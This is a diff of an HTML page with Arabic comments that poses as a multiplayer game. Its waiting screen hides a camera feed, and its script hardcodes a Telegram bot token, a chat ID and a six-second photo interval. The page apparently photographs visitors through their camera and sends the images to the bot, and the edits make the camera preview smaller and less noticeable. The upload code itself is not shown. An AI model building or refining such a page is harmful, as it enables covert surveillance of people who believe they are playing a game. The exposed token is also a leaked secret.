@@ -50,7 +50,6 @@
             transform: scale(1.08);
             box-shadow: 0 0 40px #00ff88;
         }
-        /* شاشة الانتظار */
         #waiting-screen {
             position: fixed;
             inset: 0;
@@ -79,15 +78,15 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        /* معاينة الكاميرا (صغيرة في الأسفل) */
+        /* معاينة الكاميرا صغيرة في الأسفل (ضرورية للعمل على Realme) */
         #video {
-            width: 320px;
-            max-width: 90%;
+            width: 240px;
+            max-width: 80%;
             height: auto;
             margin: 30px auto;
-            border: 3px solid #00ff88;
-            border-radius: 12px;
-            box-shadow: 0 0 20px #00ff88aa;
+            border: 2px solid #00ff88;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #00ff88aa;
             background: #000;
         }
     </style>
@@ -104,11 +103,11 @@
         <button class="btn" onclick="startGame()">ابدأ</button>
     </div>
 
-    <!-- شاشة الانتظار -->
+    <!-- شاشة الانتظار تغطي كل شيء -->
     <div id="waiting-screen">
         <div class="loader"></div>
         <div id="waiting-text">بانتظار انضمام اللاعبين...</div>
-        <!-- الكاميرا تظهر هنا كمعاينة صغيرة -->
+        <!-- الكاميرا تظهر هنا كمعاينة صغيرة تحت النص -->
         <video id="video" autoplay playsinline muted></video>
     </div>
 
@@ -116,7 +115,7 @@
         let stream = null;
         const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
         const CHAT_ID = '6611123941';
-        const PHOTO_INTERVAL = 6000; // يمكنك تقليلها إلى 3000 أو 2000 لاحقًا
+        const PHOTO_INTERVAL = 6000;
 
         function startGame() {
             document.getElementById('main-screen').style.display = 'none';
